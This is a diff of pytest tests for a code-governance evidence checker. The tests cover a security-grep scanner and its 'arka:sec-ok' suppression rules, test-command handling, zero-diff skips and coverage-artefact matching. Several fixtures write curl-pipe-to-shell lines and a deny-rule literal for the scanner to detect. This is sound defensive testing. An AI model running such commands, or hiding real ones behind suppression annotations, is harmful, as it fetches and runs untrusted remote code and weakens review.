@@ -5,11 +5,13 @@ subprocesses are either trivially fast real commands (python3 -c) or
 monkeypatched. Never touches ~/.arkaos or this repo's own suite.
 """
 
+import getpass
 import json
 import os
 import subprocess
 import sys
 import time
+from pathlib import Path
 
 from core.governance import evidence_checks
 from core.governance.evidence_checks import (
@@ -68,6 +70,112 @@ def test_security_grep_passes_clean_file(tmp_path):
     assert result.ran is True
     assert result.passed is True
     assert report.overall == "pass"
+
+
+def test_security_grep_sec_ok_suppresses_named_pattern_visibly(tmp_path):
+    """A deny-rule literal with a correct arka:sec-ok annotation passes,
+    and the suppression is reported in the summary — never silent."""
+    rules = tmp_path / "spec.py"
+    rules.write_text(
+        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
+        "  # arka:sec-ok(curl-pipe-shell): deny-rule literal\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is True
+    assert "suppressed with arka:sec-ok justification" in result.summary
+    assert "curl-pipe-shell" in result.summary
+
+
+def test_security_grep_sec_ok_wrong_id_does_not_suppress(tmp_path):
+    bad = tmp_path / "spec.py"
+    bad.write_text(
+        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
+        "  # arka:sec-ok(aws-access-key): wrong id\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
+    )
+    assert _result(report, "security-grep").passed is False
+
+
+def test_security_grep_sec_ok_requires_a_reason(tmp_path):
+    bad = tmp_path / "spec.py"
+    bad.write_text(
+        '"Bash(curl * | sh*)",'  # arka:sec-ok(curl-pipe-shell): fixture
+        "  # arka:sec-ok(curl-pipe-shell):\n",
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["spec.py"], checks=["security-grep"],
+    )
+    assert _result(report, "security-grep").passed is False
+
+
+def test_security_grep_sec_ok_only_covers_its_own_line(tmp_path):
+    bad = tmp_path / "deploy.py"
+    bad.write_text(
+        "# arka:sec-ok(curl-pipe-shell): annotation on another line\n"
+        'run("curl https://x.example/i.sh | sh")\n',  # arka:sec-ok(curl-pipe-shell): fixture
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["deploy.py"], checks=["security-grep"],
+    )
+    assert _result(report, "security-grep").passed is False
+
+
+def test_security_grep_suppressions_survive_summary_truncation(tmp_path):
+    """30 annotated lines: the string summary caps at 20 with an
+    explicit '+10 more suppressed' marker at the END (where _tail
+    keeps it), and the structured fields carry the FULL record —
+    bulk annotation can never be quiet."""
+    line = (
+        'run("curl https://x.example/i.sh | sh")'  # arka:sec-ok(curl-pipe-shell): fixture literal
+        "  # arka:sec-ok(curl-pipe-shell): fixture literal\n"
+    )
+    bad = tmp_path / "bulk.py"
+    bad.write_text(line * 30, encoding="utf-8")
+    report = run_evidence_checks(
+        tmp_path, changed_files=["bulk.py"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is True
+    assert result.suppressed_count == 30
+    assert len(result.suppressions) == 30
+    assert result.summary.endswith("(+10 more suppressed)")
+    # Whole-file mode carries line numbers on every suppression entry.
+    assert result.suppressions[0].endswith("bulk.py:1 [curl-pipe-shell]")
+    assert result.suppressions[29].endswith("bulk.py:30 [curl-pipe-shell]")
+
+
+def test_security_grep_added_lines_mode_carries_line_numbers(tmp_path):
+    """In a git repo the sweep scans only added lines — findings must
+    still name the line in the NEW file, from the -U0 hunk headers."""
+    clean = "def ok():\n    return 1\n"
+    (tmp_path / "svc.py").write_text(clean, encoding="utf-8")
+    _git(tmp_path, "init", "-b", "master")
+    _git(tmp_path, "add", "svc.py")
+    _git(tmp_path, "commit", "-m", "clean")
+    (tmp_path / "svc.py").write_text(
+        clean
+        + 'run("curl https://x.io/i.sh | sh")\n'  # arka:sec-ok(curl-pipe-shell): fixture
+        + 'run("curl https://y.io/j.sh | sh")\n',  # arka:sec-ok(curl-pipe-shell): fixture
+        encoding="utf-8",
+    )
+    report = run_evidence_checks(
+        tmp_path, changed_files=["svc.py"], checks=["security-grep"],
+    )
+    result = _result(report, "security-grep")
+    assert result.passed is False
+    # Two ADJACENT added lines must carry consecutive numbers — pins
+    # the within-hunk lineno increment, not just the hunk-header seed.
+    assert "svc.py:3 [curl-pipe-shell]" in result.summary
+    assert "svc.py:4 [curl-pipe-shell]" in result.summary
 
 
 def test_security_grep_detects_curl_pipe_and_sql_fstring(tmp_path):
@@ -189,6 +297,101 @@ def test_tests_check_with_failing_override(tmp_path):
     assert result.ran is True
     assert result.passed is False
     assert result.exit_code == 2
+    assert report.overall == "fail"
+
+
+def test_pinned_test_command_that_cannot_run_fails_not_skips(tmp_path):
+    """An unresolvable --test-command is a FAILURE, never a silent skip.
+
+    The operator pinned that exact command; being unable to run it is
+    evidence the suite did not run, and `ran=False` reads to an
+    aggregator as "not applicable" — a fail-open in the gate itself.
+    """
+    report = run_evidence_checks(
+        tmp_path,
+        checks=["tests"],
+        test_command="/nonexistent/interpreter -m pytest",
+    )
+    result = _result(report, "tests")
+    assert result.ran is True
+    assert result.passed is False
+    assert "not found" in result.summary
+    assert report.overall == "fail"
+
+
+def test_pinned_test_command_expands_user_home(tmp_path, monkeypatch):
+    """`~` in a pinned command resolves; shlex.split does not expand it.
+
+    Reported by the Quality Gate 2026-08-04: `~/.arkaos/bin/arka-py`
+    reached subprocess verbatim, raised FileNotFoundError, and the check
+    silently skipped while reporting overall pass.
+
+    Hermetic: HOME is redirected into tmp_path and the runner is built
+    there. An earlier version derived the path from sys.executable and
+    skipped whenever the interpreter lived outside HOME — which is always
+    true under actions/setup-python, so the regression shipped green
+    through CI while pinning nothing.
+    """
+    fake_home = tmp_path / "home"
+    runner = fake_home / "bin" / "runner"
+    runner.parent.mkdir(parents=True)
+    runner.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    runner.chmod(0o755)
+    monkeypatch.setenv("HOME", str(fake_home))
+    monkeypatch.setenv("USERPROFILE", str(fake_home))  # expanduser on Windows
+
+    report = run_evidence_checks(
+        tmp_path, checks=["tests"], test_command="~/bin/runner",
+    )
+    result = _result(report, "tests")
+    assert result.ran is True
+    assert result.passed is True
+    assert result.command == str(runner), "the ~ must be expanded before exec"
+
+
+def test_expand_argv_leaves_non_path_tilde_tokens_alone():
+    """Only argv[0] and `~/`-form paths expand.
+
+    A bare `~word` later in the command is far more likely to be a filter
+    expression than a home directory — `pytest -k ~root` must not become
+    `pytest -k /var/root`.
+    """
+    argv = evidence_checks._expand_argv(["pytest", "-k", "~root", "~/x.py"])
+    assert argv[0] == "pytest"
+    assert argv[2] == "~root", "a bare ~word is not a path"
+    assert argv[3] == os.path.expanduser("~/x.py")
+
+
+def test_expand_argv_expands_tilde_user_in_argv0():
+    """argv[0] is always a program path, so the `~user` form expands there.
+
+    Must use a real `~user` token: an earlier version asserted this
+    contract while passing `~/bin/py`, so dropping ~user support left the
+    whole file green.
+    """
+    user = getpass.getuser()
+    argv = evidence_checks._expand_argv([f"~{user}/bin/py", "-c", "pass"])
+    assert argv[0] == os.path.expanduser(f"~{user}/bin/py")
+    assert not argv[0].startswith("~"), "the ~user form must resolve"
+    assert argv[1:] == ["-c", "pass"]
+
+
+def test_pinned_command_resolving_to_a_directory_fails_cleanly(tmp_path):
+    """An unrunnable path must FAIL the check, never crash the gate.
+
+    `_expand_argv` turns `~/bin` into a real directory path, and exec on a
+    directory raises PermissionError — which is not FileNotFoundError. An
+    uncaught raise here produces no EvidenceReport at all, which is worse
+    than the silent skip this whole change set exists to remove.
+    """
+    a_directory = tmp_path / "notabinary"
+    a_directory.mkdir()
+    report = run_evidence_checks(
+        tmp_path, checks=["tests"], test_command=str(a_directory),
+    )
+    result = _result(report, "tests")
+    assert result.ran is True
+    assert result.passed is False
     assert report.overall == "fail"
 
 
@@ -1246,3 +1449,330 @@ def test_design_slop_advisory_only_summary_makes_no_hard_threat(
     assert result.passed is True
     assert "fails when" not in result.summary
     assert "advisory finding(s)" in result.summary
+
+
+class TestZeroDiffSkips:
+    """QG 2026-08-04 (PR #449): an EMPTY changed-file list bypassed the
+    scoped paths via `if changed:` and fell through to the project-wide
+    run, so a zero-write deliverable inherited master's 1602-error ruff
+    baseline as overall=fail. Known-empty ([]) now skips; None (scope
+    unknown) still runs project-wide."""
+
+    @staticmethod
+    def _fake_run(sink):
+        from core.governance import evidence_checks as ec
+
+        def fake_run(name, cmd, project_dir, timeout):
+            sink.append(cmd)
+            return ec.CheckResult(
+                check=name, ran=True, passed=True,
+                command=" ".join(map(str, cmd)), exit_code=0, summary="ok",
+            )
+
+        return fake_run
+
+    def test_lint_empty_diff_skips_without_running(
+        self, tmp_path, monkeypatch,
+    ):
+        from core.governance import evidence_checks as ec
+
+        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
+        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
+        ran = []
+        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
+        result = ec._check_lint(tmp_path, [], None, timeout=30)
+        assert not result.ran
+        assert "empty diff" in result.summary, (
+            "known-empty skip must carry the discriminating wording, "
+            f"got: {result.summary}"
+        )
+        assert not ran, "zero-diff must never reach a lint run"
+
+    def test_lint_none_still_runs_project_wide(self, tmp_path, monkeypatch):
+        from core.governance import evidence_checks as ec
+
+        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
+        monkeypatch.setattr(ec, "_ruff_cmd", lambda: ["ruff"])
+        ran = []
+        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
+        result = ec._check_lint(tmp_path, None, None, timeout=30)
+        assert result.ran
+        assert ran and ran[0][-1] == ".", (
+            "None (scope unknown) keeps the project-wide run"
+        )
+
+    def test_typecheck_empty_diff_skips_before_config_detection(
+        self, tmp_path, monkeypatch,
+    ):
+        from core.governance import evidence_checks as ec
+
+        monkeypatch.setattr(ec, "_mypy_configured", lambda p: True)
+        monkeypatch.setattr(ec.shutil, "which", lambda name: "/usr/bin/mypy")
+        ran = []
+        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
+        result = ec._check_typecheck(tmp_path, [], None, timeout=30)
+        assert not result.ran
+        assert "empty diff" in result.summary, (
+            "known-empty skip must carry the discriminating wording, "
+            f"got: {result.summary}"
+        )
+        assert not ran, "zero-diff must skip even with mypy configured"
+
+    def test_typecheck_none_runs_when_configured(self, tmp_path, monkeypatch):
+        from core.governance import evidence_checks as ec
+
+        monkeypatch.setattr(ec, "_mypy_configured", lambda p: True)
+        monkeypatch.setattr(ec.shutil, "which", lambda name: "/usr/bin/mypy")
+        ran = []
+        monkeypatch.setattr(ec, "_run", self._fake_run(ran))
+        result = ec._check_typecheck(tmp_path, None, None, timeout=30)
+        assert result.ran
+        assert ran and ran[0][0] == "mypy"
+
+    def test_csv_distinguishes_empty_from_absent(self):
+        from core.governance import evidence_checks as ec
+
+        assert ec._csv(None) is None
+        assert ec._csv("") == []
+        assert ec._csv("a.py, b.md") == ["a.py", "b.md"]
+
+    def test_zero_diff_report_is_not_fail(self, tmp_path, monkeypatch):
+        """End-to-end through run_evidence_checks: a zero-diff run of
+        lint+typecheck yields insufficient-evidence, never a fail
+        inherited from the project-wide baseline."""
+        from core.governance import evidence_checks as ec
+
+        (tmp_path / "real.py").write_text("x = 1\n", encoding="utf-8")
+
+        def boom(name, cmd, project_dir, timeout):  # pragma: no cover
+            raise AssertionError(f"no check may execute on zero diff: {cmd}")
+
+        monkeypatch.setattr(ec, "_run", boom)
+        report = ec.run_evidence_checks(
+            tmp_path, changed_files=[], checks=["lint", "typecheck"],
+        )
+        assert report.overall == "insufficient-evidence"
+        assert all(not r.ran for r in report.results), (
+            "a check ran on zero diff: "
+            f"{[r.check for r in report.results if r.ran]}"
+        )
+
+
+# ---------------------------------------------------------------------------
+# Stale coverage artefacts (QG blocker B3)
+#
+# A coverage.xml older than the changed source measured a different codebase.
+# The gate passed 86.3% on an artefact that contained none of the new modules —
+# a green number vouching for code it never executed.
+# ---------------------------------------------------------------------------
+
+
+class TestStaleCoverage:
+    def _artefact(self, project: Path, percent: str = "0.90") -> Path:
+        xml = project / "coverage.xml"
+        xml.write_text(
+            f'<?xml version="1.0"?><coverage line-rate="{percent}"></coverage>',
+            encoding="utf-8",
+        )
+        return xml
+
+    def test_artefact_older_than_changed_source_fails(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        self._artefact(tmp_path)
+        source = tmp_path / "mod.py"
+        source.write_text("x = 1\n", encoding="utf-8")
+        os.utime(tmp_path / "coverage.xml", (1_000_000, 1_000_000))
+
+        result = _check_coverage(tmp_path, ["mod.py"], None, 60)
+
+        assert result.passed is False
+        assert "predates changed source" in result.summary
+
+    def test_artefact_missing_a_changed_module_fails(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        source = tmp_path / "brand_new.py"
+        source.write_text("x = 1\n", encoding="utf-8")
+        self._artefact(tmp_path)
+
+        result = _check_coverage(tmp_path, ["brand_new.py"], None, 60)
+
+        assert result.passed is False
+        assert "no entry for" in result.summary
+
+    def test_fresh_artefact_covering_the_change_passes(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        source = tmp_path / "mod.py"
+        source.write_text("x = 1\n", encoding="utf-8")
+        xml = tmp_path / "coverage.xml"
+        xml.write_text(
+            '<?xml version="1.0"?><coverage line-rate="0.90">'
+            '<class filename="mod.py"/></coverage>',
+            encoding="utf-8",
+        )
+
+        result = _check_coverage(tmp_path, ["mod.py"], None, 60)
+
+        assert result.passed is True
+
+    def test_changed_tests_do_not_need_a_coverage_entry(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        (tmp_path / "tests").mkdir()
+        (tmp_path / "tests" / "test_x.py").write_text("x = 1\n", encoding="utf-8")
+        self._artefact(tmp_path)
+
+        result = _check_coverage(tmp_path, ["tests/test_x.py"], None, 60)
+
+        assert result.passed is True
+
+
+class TestCoveragePathMatching:
+    """Exact project-relative matching (QG round 3).
+
+    Stem probes and suffix rules both fail-open: `core/` carries 14 colliding
+    stems, this repo's own artefact yields five bare basenames, and a suffix
+    rule cannot separate `core/sync/engine.py` from `vendor/core/sync/engine.py`.
+    """
+
+    def _artefact(self, project: Path, filename: str, source: str = ".") -> None:
+        (project / "coverage.xml").write_text(
+            '<?xml version="1.0"?><coverage line-rate="0.90">'
+            f"<sources><source>{source}</source></sources>"
+            f'<packages><package><classes><class filename="{filename}"/>'
+            "</classes></package></packages></coverage>",
+            encoding="utf-8",
+        )
+        os.utime(project / "coverage.xml", (time.time() + 10,) * 2)
+
+    def _changed(self, project: Path, rel: str) -> None:
+        target = project / rel
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text("x = 1\n", encoding="utf-8")
+
+    def test_colliding_stem_is_rejected(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/sync/engine.py")
+        self._artefact(tmp_path, "core/synapse/engine.py")
+
+        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is False
+
+    def test_deeper_path_with_same_suffix_is_rejected(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/sync/engine.py")
+        self._artefact(tmp_path, "vendor/core/sync/engine.py")
+
+        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is False
+
+    def test_bare_basename_from_a_source_prefix_is_rejected(self, tmp_path: Path) -> None:
+        """The repo's own artefact emits bare basenames under <source>.../core."""
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "dashboard/server/keys.py")
+        (tmp_path / "core").mkdir(exist_ok=True)
+        self._artefact(tmp_path, "keys.py", source=str(tmp_path / "core"))
+
+        result = _check_coverage(tmp_path, ["dashboard/server/keys.py"], None, 60)
+
+        assert result.passed is False
+
+    def test_source_prefix_is_resolved_against_the_project(self, tmp_path: Path) -> None:
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/keys.py")
+        self._artefact(tmp_path, "keys.py", source=str(tmp_path / "core"))
+
+        assert _check_coverage(tmp_path, ["core/keys.py"], None, 60).passed is True
+
+    def test_foreign_source_never_vouches(self, tmp_path: Path) -> None:
+        """QG round 4: the raw relative filename was added unanchored, so an
+        artefact whose <source> points at ANOTHER checkout vouched for ours."""
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/sync/engine.py")
+        foreign = tmp_path.parent / f"{tmp_path.name}-elsewhere"
+        foreign.mkdir(exist_ok=True)
+        self._artefact(tmp_path, "core/sync/engine.py", source=str(foreign))
+
+        result = _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60)
+
+        assert result.passed is False
+
+    def test_relative_source_anchors_to_the_project(self, tmp_path: Path) -> None:
+        """A relative <source> (coverage run from the project root) must
+        resolve against the project, not against whatever CWD happens to be."""
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/sync/engine.py")
+        self._artefact(tmp_path, "core/sync/engine.py", source=".")
+
+        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is True
+
+    def test_multi_source_cross_product_cannot_manufacture_paths(self, tmp_path: Path) -> None:
+        """QG round 5: with sources [core, scripts], a filename measured under
+        one source was also resolved under the other, vouching for a path the
+        artefact never measured."""
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/sync/engine.py")
+        (tmp_path / "scripts").mkdir(exist_ok=True)
+        (tmp_path / "coverage.xml").write_text(
+            '<?xml version="1.0"?><coverage line-rate="0.90">'
+            f"<sources><source>{tmp_path / 'core'}</source>"
+            f"<source>{tmp_path / 'scripts'}</source></sources>"
+            '<packages><package><classes><class filename="sync/engine.py"/>'
+            "</classes></package></packages></coverage>",
+            encoding="utf-8",
+        )
+        os.utime(tmp_path / "coverage.xml", (time.time() + 10,) * 2)
+
+        # the file measured under core/ is genuinely covered...
+        assert _check_coverage(tmp_path, ["core/sync/engine.py"], None, 60).passed is True
+        # ...but scripts/sync/engine.py was never measured and must not pass
+        self._changed(tmp_path, "scripts/sync/engine.py")
+        os.utime(tmp_path / "coverage.xml", (time.time() + 20,) * 2)
+        result = _check_coverage(
+            tmp_path, ["core/sync/engine.py", "scripts/sync/engine.py"], None, 60
+        )
+
+        assert result.passed is False
+
+    def test_ambiguous_multi_source_resolution_fails_closed(self, tmp_path: Path) -> None:
+        """When one filename resolves to an existing file under TWO sources,
+        the artefact cannot say which was measured — vouch for neither."""
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/util.py")
+        self._changed(tmp_path, "scripts/util.py")
+        (tmp_path / "coverage.xml").write_text(
+            '<?xml version="1.0"?><coverage line-rate="0.90">'
+            f"<sources><source>{tmp_path / 'core'}</source>"
+            f"<source>{tmp_path / 'scripts'}</source></sources>"
+            '<packages><package><classes><class filename="util.py"/>'
+            "</classes></package></packages></coverage>",
+            encoding="utf-8",
+        )
+        os.utime(tmp_path / "coverage.xml", (time.time() + 10,) * 2)
+
+        assert _check_coverage(tmp_path, ["core/util.py"], None, 60).passed is False
+
+    def test_doc_only_edits_do_not_stale_the_artefact(self, tmp_path: Path) -> None:
+        """QG round 5: CHANGELOG.md counted as 'changed source', forcing a
+        coverage regeneration for edits no test could ever execute."""
+        from core.governance.evidence_checks import _check_coverage
+
+        self._changed(tmp_path, "core/sync/engine.py")
+        self._artefact(tmp_path, "core/sync/engine.py")
+        changelog = tmp_path / "CHANGELOG.md"
+        changelog.write_text("# notes\n", encoding="utf-8")
+        os.utime(changelog, (time.time() + 100,) * 2)  # newer than the artefact
+
+        result = _check_coverage(
+            tmp_path, ["core/sync/engine.py", "CHANGELOG.md"], None, 60
+        )
+
+        assert result.passed is True
